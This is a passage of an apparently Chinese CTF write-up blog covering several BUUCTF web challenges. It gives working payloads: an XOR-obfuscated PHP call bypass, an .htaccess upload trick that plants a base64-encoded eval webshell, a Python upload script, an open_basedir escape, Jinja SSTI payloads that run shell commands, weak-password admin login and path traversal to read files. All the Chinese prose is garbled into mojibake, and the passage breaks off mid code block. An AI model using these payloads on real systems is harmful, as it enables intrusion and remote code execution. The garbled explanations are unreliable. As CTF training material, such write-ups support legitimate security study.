</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?.=${%80%80%80%80^%DF%C7%C5%D4}{%81}();&amp;%81=phpinfo
</span></span><span class="line"><span class="cl">//ËøôÈáå.Âíå_‰∏ÄÊ†∑ÁöÑ
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÈùûÈ¢ÑÊúüÊòØÁõ¥Êé•ÊêúflagÂ∞±Âá∫Êù•‰∫Ü</p>
<p>È¢ÑÊúüËß£Âà©Áî®get_the_flagÂáΩÊï∞</p>
<p>Êñá‰ª∂‰∏ä‰º†ÈÉ®ÂàÜËøáÊª§‰∫ÜÊãìÂ±ïÂêçphÔºåËÄå‰∏îÊää&lt;?ËøáÊª§‰∫ÜÔºå‰ΩÜÊòØphp7‰∏çËÉΩÁî®scriptÊ†áÁ≠æÁªïËøá‰∫Ü</p>
<p><code>exif_imagetype</code>‰∏çËÉΩÁÆÄÂçïÁî®GIF89aÁªïËøá‰∫ÜÔºåËøôÈáåÂèØ‰ª•Âú®.htaccessÊ∑ªÂä†Êñá‰ª∂Â§¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#define width 1
</span></span><span class="line"><span class="cl">#define height 1
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÊàñËÄÖÂú®.htaccessÂâçÊ∑ªÂä†x00x00x8ax39x8ax39(Ë¶ÅÂú®ÂçÅÂÖ≠ËøõÂà∂ÁºñËæëÂô®‰∏≠Ê∑ªÂä†ÔºåÊàñËÄÖ‰ΩøÁî®pythonÁöÑbytesÁ±ªÂûã)
</span></span><span class="line"><span class="cl">x00x00x8ax39x8ax39 ÊòØwbmpÊñá‰ª∂ÁöÑÊñá‰ª∂Â§¥
</span></span><span class="line"><span class="cl">.htaccess‰∏≠‰ª•0x00ÂºÄÂ§¥ÁöÑÂêåÊ†∑‰πüÊòØÊ≥®ÈáäÁ¨¶ÔºåÊâÄ‰ª•‰∏ç‰ºöÂΩ±Âìç.htaccess
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âà©Áî®<code>php_value auto_append_file</code>ÊåáÂÆöÊñá‰ª∂ÂåÖÂê´ÔºåÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Âà©Áî®base64Êù•ËøõË°åÁªïËøá&lt;?Ê†áÁ≠æÈôêÂà∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#define width 1
</span></span><span class="line"><span class="cl">#define height 1
</span></span><span class="line"><span class="cl">AddType application/x-httpd-php .jpg
</span></span><span class="line"><span class="cl">php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=./1.jpg&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂú®1.jpgÈáåÈù¢ÂÜôÂÖ•base64ÁöÑÈ©¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89abb
</span></span><span class="line"><span class="cl">PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂõ†‰∏∫base64Ëß£ÂØÜÊòØ4‰Ωç‰∏ÄËß£Á†ÅÔºåÊàë‰ª¨Ë°•‰∏ä‰∏§‰∏™bÂáëÂõõ‰Ωç</p>
<p>Âà©Áî®ËÑöÊú¨‰∏ä‰º†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">htaccess</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">#define width 1337
</span></span></span><span class="line"><span class="cl"><span class="s2">#define height 1337 
</span></span></span><span class="line"><span class="cl"><span class="s2">AddType application/x-httpd-php .jpg
</span></span></span><span class="line"><span class="cl"><span class="s2">php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=./shell.jpg&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;GIF89abbPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://0e57dfd9-bd66-4101-8c76-8baa918b86bb.node5.buuoj.cn:81/?_=${</span><span class="si">%86%</span><span class="s2">86</span><span class="si">%86%</span><span class="s2">86^</span><span class="si">%d</span><span class="s2">9</span><span class="si">%c</span><span class="s2">1</span><span class="si">%c</span><span class="s2">3</span><span class="si">%d</span><span class="s2">2}{%86}();&amp;%86=get_the_flag&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:(</span><span class="s1">&#39;.htaccess&#39;</span><span class="p">,</span><span class="n">htaccess</span><span class="p">,</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;upload&#34;</span><span class="p">:</span><span class="s2">&#34;Submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:(</span><span class="s1">&#39;shell.jpg&#39;</span><span class="p">,</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âá∫Êù•Ë∑ØÂæÑ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">upload</span><span class="o">/</span><span class="n">tmp_fc3f8d0d99ccdde85c8cfc624fe94c32</span><span class="o">/.</span><span class="n">htaccess</span>
</span></span><span class="line"><span class="cl"><span class="n">upload</span><span class="o">/</span><span class="n">tmp_fc3f8d0d99ccdde85c8cfc624fe94c32</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">jpg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËöÅÂâëËøûÊé•Êèí‰ª∂ÁªïËøá</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405003120497.png"
	width="1284"
	height="870"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405003120497_hu17814701339037755575.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405003120497_hu5456182209726558398.png 1024w"
	loading="lazy"
	
		alt="image-20250405003120497"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<p>ÊàñËÄÖÂÜôÊñá‰ª∂Êù•ËØªÊ†πÁõÆÂΩï‰∏ãÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËØªÂà∞‰πãÂêé</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/THis_Is_tHe_F14g&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-Âçé‰∏úÂçóËµõÂå∫double-secret">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Double Secret
</h2><p>ÁõÆÂΩïÊâ´ÊèèÊâ´Âá∫/console</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405134111628.png"
	width="1906"
	height="839"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405134111628_hu9036054098883809945.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405134111628_hu2275185277405147910.png 1024w"
	loading="lazy"
	
		alt="image-20250405134111628"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="545px"
	
></p>
<p>ÂæóÁÆópinÁ†Å‰∫ÜÔºå‰ΩÜÊòØ‰ø°ÊÅØ‰∏çÂ§ü</p>
<p>ÂõûÂà∞ÂéüÊù•ÁïåÈù¢ÔºåËÆøÈóÆ/secretË∑ØÁî±</p>
<p>‰º†ÂèÇsecretÔºåÂá∫Áé∞Êä•Èîô</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405135959717.png"
	width="1339"
	height="520"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405135959717_hu5254101068254404053.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405135959717_hu12949540666531859052.png 1024w"
	loading="lazy"
	
		alt="image-20250405135959717"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="618px"
	
></p>
<p>rc4Âä†ÂØÜ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if(secret==None):
</span></span><span class="line"><span class="cl">       return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;
</span></span><span class="line"><span class="cl">   rc=rc4_Modified.RC4(&#34;HereIsTreasure&#34;)   #Ëß£ÂØÜ
</span></span><span class="line"><span class="cl">   deS=rc.do_crypt(secret)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   a=render_template_string(safe(deS))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   if &#39;ciscn&#39; in a.lower():
</span></span><span class="line"><span class="cl">       return &#39;flag detected!&#39;
</span></span><span class="line"><span class="cl">   return a
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâìsstiÁÑ∂ÂêéÁî®rc4Âä†ÂØÜÔºåÁî®cyberchefÂä†ÂØÜ</p>
<p>ÊàñËÄÖ‰∏äËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_main</span><span class="p">(</span><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;init_key&#34;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;init_message&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;RC4Âä†ÂØÜ‰∏ªÂáΩÊï∞&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_box</span> <span class="o">=</span> <span class="n">rc4_init_sbox</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">crypt</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">rc4_excrypt</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">s_box</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="n">crypt</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_init_sbox</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_box</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;ÂéüÊù•ÁöÑ s ÁõíÔºö%s&#34; % s_box)</span>
</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">s_box</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">s_box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">s_box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">s_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;Ê∑∑‰π±ÂêéÁöÑ s ÁõíÔºö%s&#34;% s_box)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s_box</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_excrypt</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">box</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;Ë∞ÉÁî®Âä†ÂØÜÁ®ãÂ∫èÊàêÂäü„ÄÇ&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">plain</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">t</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">^</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="n">quote</span><span class="p">(</span><span class="n">cipher</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">rc4_main</span><span class="p">(</span><span class="s2">&#34;HereIsTreasure&#34;</span><span class="p">,</span><span class="s2">&#34;{{lipsum.__globals__.__builtins__.eval(</span><span class="se">\&#34;</span><span class="s2">__import__(&#39;os&#39;).popen(&#39;cat /flag.txt&#39;).read()</span><span class="se">\&#34;</span><span class="s2">)}}&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;cat /flag.txt&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405143658043.png"
	width="1533"
	height="500"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405143658043_hu4273674931847572516.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405143658043_hu16056203718559103721.png 1024w"
	loading="lazy"
	
		alt="image-20250405143658043"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="735px"
	
></p>
<h2 id="gkctf-2021easycms">[GKCTF 2021]easycms
</h2><p>ÁõÆÂΩïÊâ´Êèèadmin.php</p>
<p>Âº±Âè£‰ª§admin/12345ÁôªÂÖ•</p>
<p>Âú®ËÆæËÆ°ËøôÈáåËá™ÂÆö‰πâÂèØ‰ª•ÁºñËæëphp‰ª£Á†Å</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405145501063.png"
	width="1530"
	height="756"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405145501063_hu17915190112882951253.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405145501063_hu1102986416410717993.png 1024w"
	loading="lazy"
	
		alt="image-20250405145501063"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>/var/www/html/system/tmp/tgom.txt</p>
<p>Êñ∞Âª∫‰∏Ä‰∏™Êñá‰ª∂,‰∏ä‰º†ÂêéÁºñËæë</p>
<p>Êñá‰ª∂Âêç‰∏∫../../../../../system/tmp/tgom</p>
<p>ÁÑ∂ÂêéÂõûÂéªÁºñËæëÂ∞±Ë°å‰∫ÜÔºåÂõûÂà∞‰∏ªÈ°µÂ∞±ËÉΩÁúãÂà∞flag</p>
<p>Âè¶‰∏ÄÁßçÂÅöÊ≥ïÔºåÂØºÂá∫‰∏ªÈ¢ò</p>
<p>‰ºöÊèêÁ§∫‰∏ãËΩΩÔºåÂ§çÂà∂‰∏ãËΩΩËøûÊé•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">18</span><span class="n">f6826c</span><span class="o">-</span><span class="mi">975</span><span class="n">b</span><span class="o">-</span><span class="mi">4018</span><span class="o">-</span><span class="mi">8</span><span class="n">d7c</span><span class="o">-</span><span class="mi">014</span><span class="n">a078b56b0</span><span class="o">.</span><span class="n">node5</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="p">:</span><span class="mi">81</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">m</span><span class="o">=</span><span class="n">ui</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">downloadtheme</span><span class="o">&amp;</span><span class="n">theme</span><span class="o">=</span><span class="n">L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA</span><span class="o">=</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊääÂêéÈù¢Ëøô‰∏≤base64Ëß£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">theme</span><span class="o">/</span><span class="n">default</span><span class="o">/</span><span class="mf">1.</span><span class="n">zip</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êàë‰ª¨Êîπ‰∏∫/flagÂ∞±Ë°å‰∫Ü</p>
<p>ÁÑ∂Âêé‰∏ãËΩΩÂæóÂà∞flag</p>
<h2 id="bjdctf2020ezphp">[BJDCTF2020]EzPHP
</h2><p>ÁúãÊ∫êÁ†ÅÊúâbase32ÁºñÁ†ÅÔºåËß£Á†ÅÂæó1nD3x.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
